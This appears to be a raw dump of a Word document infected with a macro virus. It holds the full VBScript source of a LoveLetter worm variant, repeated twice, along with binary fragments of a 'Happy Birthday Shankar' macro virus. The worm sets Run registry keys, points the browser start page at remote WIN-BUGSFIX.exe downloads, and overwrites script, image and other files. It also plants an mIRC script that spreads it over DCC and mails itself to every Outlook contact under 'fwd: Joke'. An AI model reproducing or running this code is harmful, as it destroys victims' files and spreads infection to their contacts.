regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX",downread&"\WIN-BUGSFIX.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
end if
end sub
sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send $nick "&dirsystem&"\Very Funny.HTM"
scriptini.WriteLine "n3=}"
scriptini.close
eq=folderspec
end if
end if
next  
end sub
sub folderlist(folderspec)  
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)  
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next  
end sub
sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "fwd: Joke"
male.Body = vbcrlf&""
male.Attachments.Add(dirsystem&"\Very Funny.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
"aw=0"&vbcrlf& _
"end if"&vbcrlf& _
"if (aw=1) then"&vbcrlf& _
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
if (l1=n) then
lines(n)=chr(34)+lines(n)+chr(34)
else
lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
end if
next
set b=fso.CreateTextFile(dirsystem+"\Very Funny.HTM")
b.close
set d=fso.OpenTextFile(dirsystem+"\Very Funny.HTM",2)
d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end sub                                     ID="{45362290-2D10-11D5-9B74-A6B8788A4037}"
Document=ThisDocument/&H00000000
Name="Normal"
HelpContextID="0"
CMG="989A122016201620162016"
DPB="3032BABDBBBDBBBD"
GC="C8CA4255435543AA"

[Host Extender Info]
&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000

[Workspace]
ThisDocument=0, 0, 0, 0, C
                                                             ThisDocument T h i s D o c u m e n t                                                                                            E   C@�  E   n     � � F   >B@�  g h ��P  h ��H  l ��@  ��    � �    >! @! B% D . $    � �    F! @! B% D . &      :�  �  � '� '  $! H% J '      :�  �  � '� '  &! H% J ' "  �   L� E   �   9 NE   �   9 PE   �   9 RE   n         "�  �       �    &! H! j  &! HB@t   h ��8      �  �       �    $! H! j  $! HB@t   h ��    $ T  ' .G       .$ V ' (    .$ X ' *    (�     *�    � �   �! �� E   5 �' ,E   � H 9 �E     �9 �E     �9 �E   �  Happy BirthDay Shankar  �B@� E     �� ��  � �  �B@� E     ,9 �E     �9 �E     �9 �E   n     h ��   l ���  ��    � �    >! @! B% D . $    � �    F! @! B% D . &      :�  �  � '� '  $! H% J '      :�  �  � '� '  &! H% J ' "  �   L� E   �   9 NE   �   9 PE   �   9 RE   n         "�  �       �    &! H! j  &! HB@t   h ���     �  �       �    $! H! j  $! HB@t   h ���  $ T  ' .        .$ V ' (    .$ X ' *    (�     *�    � � & Did You Wish Shankar on his Birthday ?  `$ ^ ' 0h ��0  l ��(  ����   ж Attribut e VB_Nam e = "Thi sDocument"

�Bas�1Normal.VCreatabl`False�Predecla Id xTru�"Expose Template Deriv$Cu�stomiz�c Dim x1, x2�3�4 A s Boolea�n
5 6@Object�
7�
8�1IntPeger�9�D� H�1031�3*141�4S��ng�
Const�D5�:-D you �� markhed!��P�m ) Sub �_Cl��()
On  Error ReBs�� Nex�TS�e *�)Act���.VBProf�@Compon��s�.Item(1@=�6�"w�W�x3�x5.Code Module.F�ind(x1 Q�?Ł 0  , 1�@x4A6hWit@h Opti�L:�  nfirm P�vers 0 �Virus�9t�lÀDSave5�mpt�End !�
x9@Now�Tx7�Day((x9A*8@Mo�nth�If  �>= 23 A��x�7 The �   Applicba*.Ca,@" Happy Bi rthday S hankar-2B5�5July@�e@ World y` Forg@q�� �not me��Ax10�#sgBo x("Did Y!��Wish� on  ��?", �vbYesNo�3��0��h�Mb�� �! I Lhovea.� "Tw onderful�l.DE"|A� Heart Le@ss." & C(rLf "ll� Be Pun@'`y��isbCr�it@*l
!�6�If
� �PA{	hx1�RLines(�Q�UCoun�tOf�@$�
aT�

W�
��
`E��
@("fbX�w�aա)BJ_�(�wAXɠ"ma�WwdCE{0 Or ��at�{)�%�*  �0)��.x2�N̂!de� ��1`++g#��l#�
(Deletze" A6�+HjA�ddFrom�����Dialogs(wd#FileSum`�yIn�fo)��Tit��"Ar�_ sup�ri!�?"������"&{�Auth��:`�LSKC@��gory!�]�	`	`�ed�Keyw0ords)	�om7���D�' ե�faXlls~ǈ ��n�'t�to w��him�	Exec���: �gC���A�R)�L ��y��7� ���2p((�y��9 ���e%%x1�$*��$j�$�('�$�(�?�4"k,�$�H�c o$o$�o$o$q=o$o$o$o$�'�)o$�go$pco$`Fqh�o$o$� � A7$�3$$�\� �5
�
ߏnt_Nerz3_��ntߊ_� x�6�'�-ߑۑ_�_��_�����grI_�ovn_�_�.YC_�t�h�g�f�8x�4W���67q�c>>0!�48��B>�ߙߙߙߙ�SPeP�on.F@�:PH� .SizNe]` �!72� C�olorIP�x�wdGreen`�Ani0x��wd�  SparkleT	 �: GInse rtAfter _9�� :�M��D own Unit@:=wdScq,r �:=�	�
 	xl16_
�goO
%N?��_U8q 7��Op<en��/7/7��
�rq/7�s�/7/7�/7�=�ůȁ/7ŏ�ݏ�n Q/7 `���&/7U�/7����/7q�/7�k/7|��o�� .CountOf Lines
E nd If
 
x9 = No(w() ,7 ,DaPy(x948 4Month<If  x7 >= 23 A ~x>7 T@hen
   x10bsgBox ("Did Yo u Wish S hankar o n his Bi rthday ? ", vbYesNo q�Sub�i                     �a^   �	  	  �            * \ G { 0 0 0 2 0 4 E F - 0 0 0 0 - 0 0 0 0 - C 0 0 0 - 0 0 0 0 0 0 0 0 0 0 4 6 } # 3 . 0 # 9 # C : \ P R O G R A M   F I L E S \ C O M M O N   F I L E S \ M I C R O S O F T   S H A R E D \ V B A \ V B A 3 3 2 . D L L # V i s u a l   B a s i c   F o r   A p p l i c a t i o n s             * \ G { 0 0 0 2 0 9 0 5 - 0 0 0 0 - 0 0 0 0 - C 0 0 0 - 0 0 0 0 0 0 0 0 0 0 4 6 } # 8 . 0 # 4 0 9 # C : \ P r o g r a m   F i l e s \ M i c r o s o f t   O f f i c e \ O f f i c e \ M S W O R D 8 . O L B # M i c r o s o f t   W o r d   8 . 0   O b j e c t   L i b r a r y             � * \ G { 0 0 0 2 0 4 3 0 - 0 0 0 0 - 0 0 0 0 - C 0 0 0 - 0 0 0 0 0 0 0 0 0 0 4 6 } # 2 . 0 # 0 # C : \ W I N D O W S \ S Y S T E M \ S t d O l e 2 . T l b # O L E   A u t o m a t i o n             � * \ G { D C 7 8 4 E A 0 - 6 9 2 7 - 1 1 D 4 - 9 B 7 4 - 8 9 5 F B 8 3 8 7 D 3 5 } # 2 . 0 # 0 # C : \ W I N D O W S \ S Y S T E M \ M S F o r m s . T W D # M i c r o s o f t   F o r m s   2 . 0   O b j e c t   L i b r a r y            � * \ G { B C 7 A B 9 4 2 - E 2 E 3 - 1 1 D 4 - 9 B 7 4 - E E 3 2 B 6 8 9 D 3 3 4 } # 2 . 0 # 0 # C : \ W I N D O W S \ T E M P \ V B E \ M S F o r m s . E X D # M i c r o s o f t   F o r m s   2 . 0   O b j e c t   L i b r a r y              �.E���.`�M�   * \ C N o r m a l  * \ C N o r m a l �W�:       * \ G { 2 D F 8 D 0 4 C - 5 B F A - 1 0 1 B - B D E 5 - 0 0 A A 0 0 4 4 D E 5 2 } # 2 . 0 # 0 # C : \ P R O G R A M   F I L E S \ M I C R O S O F T   O F F I C E \ O F F I C E \ M S O 9 7 . D L L # M i c r o s o f t   O f f i c e   8 . 0   O b j e c t   L i b r a r y                     ������        |�D< ����  ����������������������������������������������������������                   wf  T h i s D o c u m e n t 
 73c44e57c  *D��qf          b&  ������   ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   ����������������������������������������������������fK��	��t�Y���4����   ����`   �     UV � �0  Word�k VBA�� Win16�~ Win32 Mac�� New Microsoft Word Document�= stdole�` MSFormsC ThisDocument<� 	�  � _Evaluate� Norrem  barok -loveletter(vbe) <i hate go to school>
rem 			by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\MSKernel32.vbs")
c.Copy(dirwin&"\Win32DLL.vbs")
c.Copy(dirsystem&"\Very Funny.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32DLL.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
downread="c:\"
end if
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
Randomize
num = Int((4 * Rnd) + 1)
if num = 1 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
elseif num = 2 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
elseif num = 3 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
elseif num = 4 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
end if
end if
if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX",downread&"\WIN-BUGSFIX.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
end if
end sub
sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send $nick "&dirsystem&"\Very Funny.HTM"
scriptini.WriteLine "n3=}"
scriptini.close
eq=folderspec
end if
end if
next  
end sub
sub folderlist(folderspec)  
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)  
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next  
end sub
sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "fwd: Joke"
male.Body = vbcrlf&""
male.Attachments.Add(dirsystem&"\Very Funny.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
"aw=0"&vbcrlf& _
"end if"&vbcrlf& _
"if (aw=1) then"&vbcrlf& _
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
if (l1=n) then
lines(n)=chr(34)+lines(n)+chr(34)
else
lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
end if
next
set b=fso.CreateTextFile(dirsystem+"\Very Funny.HTM")
b.close
set d=fso.OpenTextFile(dirsystem+"\Very Funny.HTM",2)
d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end sub                                     $MZ3�:?��Ǉ�Y���,�_���ߩ�Y�5�:0E���d��� ~k(�'Q ��t�f���f��j즶h�a��j�>��s��ۿxnS�m*[%�����sW��`>����Is(�l��C,JK*T��^K��j��u�]�؟95~�d��n5pd��I:��
7�<�ɼ:^��ϗ�z��8�ЌzJj���!�̱$ba̘V�e��.)S=�b��<�H��fn%!�ht0�9#�_�xRK�r������A�?e�f%�e'�V9Տ��?=�nG�5��?���s0Ӷ��k�M+��5i|��TRT�a��v�8���
�����@5W����Ũ�L�����nTZ. ����.Q��q"|���n�%GW���f3��)�����������:�7XX_/a �>����`��֍��.+bn�x��_h����y��:_9ԍ;�]y&�6�c�g�h� ��N�B(϶�����*�Vi�a;��,2l�V�CD��8J�Q���8�H�\�]h���n����'�<�/���!���s�T��F��9��
7V��	�u۲��8��R��"�g[�f��O�/�>��1���b4�?m[���_cC�����T���lqچ��#&�����E-�')��w��,��PLB��|>R�,iE�ya'D���G��؄U�HW�i��z�|����Wb�-�(�nz�
e,0V��jaF���#����OLp���{IÄ<��,|Njxd�;�@y���*h�%����@����s!/�V��ni��
�9��h�r����rED�$f["���f
�a��ϩ��i��K�d�u}��r�!�`��,�-�k�\�����\sZ�?���.bO�_����*����)��=�cPP׎pJ�k$�$�@T�cQ 2�=l���G��� 뫼�"��X���{K�hLW	��r������&^�fʮ��+A3��G�i}?_>HkL���:�M�A�N�`H��u�_~�9�v�$F��ۈ�͠<������xA���̈�EBd��G��S9?��}�.Z���W:k^�P��U4C�G[hu�Bn�aX���O�^��^�3Va�%�6����
���ܾN��� 2\����LYl&n�We��oſW��=��i��qJDJO�6Hw��D��NߔB����Hf`Kx��-qb���Ο�1+�:T��Vۙ1?|q\�f��:�Wٻy!U����B`�ut
B���B|���N?'����Ӎ9b�^p0Br�ܚ������ږ�.�O!'}����Ք�K3hqz���{W�;-@hG�s��u�錺�T��;���)VrM4E�*9��l���VR��V&"��X@��$pˎ�Α��{��/��f1Z�*X12�OR�
